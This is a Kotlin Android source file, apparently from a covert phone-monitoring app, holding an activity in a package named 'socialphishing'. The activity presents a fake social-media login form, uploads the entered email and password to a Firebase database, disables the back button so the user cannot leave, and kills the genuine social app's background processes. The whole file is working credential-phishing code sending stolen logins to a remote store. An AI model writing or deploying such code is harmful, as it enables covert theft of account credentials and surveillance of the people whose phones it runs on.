package com.github.muneebwanee.dash.ui.activities.socialphishing

import android.app.ActivityManager
import android.content.Context
import android.os.Bundle
import android.view.KeyEvent
import android.widget.Button
import android.widget.EditText
import com.github.muneebwanee.da.R
import com.github.muneebwanee.dash.data.model.Social
import com.github.muneebwanee.dash.data.rxFirebase.InterfaceFirebase
import com.github.muneebwanee.dash.services.social.MonitorService
import com.github.muneebwanee.dash.ui.activities.base.BaseActivity
import com.github.muneebwanee.dash.utils.ConstFun.getPackageCheckSocial
import com.github.muneebwanee.dash.utils.Consts.CHILD_SOCIAL_MS
import com.github.muneebwanee.dash.utils.Consts.SOCIAL
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.longToast
import kotterknife.bindView
import javax.inject.Inject

/**
 * Created by muneebwanee on 15/12/20.
 */
class SocialActivityM : BaseActivity(R.layout.activity_s) {

    private val txtEmail : EditText by bindView(R.id.txt_email_social)
    private val txtPass : EditText by bindView(R.id.txt_password_social)
    private val btnLogin : Button by bindView(R.id.btn_login_social)

    @Inject lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        getComponent()!!.inject(this)
        onClickApp()
    }

    private fun onClickApp(){
        btnLogin.setOnClickListener {
            if (txtEmail.text.toString() != "" && txtPass.text.toString() != ""){
                val social = Social(txtEmail.text.toString(),txtPass.text.toString())
                firebase.getDatabaseReference("$SOCIAL/$CHILD_SOCIAL_MS").setValue(social).addOnCompleteListener {
                    stopService(IntentFor<MonitorService>(this))
                    finish()
                }
            }else{
                longToast(R.string.all_fields)
            }
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK){
            //killApp()
            //finish()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onPause() {
        super.onPause()
        killApp()
    }

    private fun killApp(){
        val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        am.killBackgroundProcesses(getPackageCheckSocial())
    }


}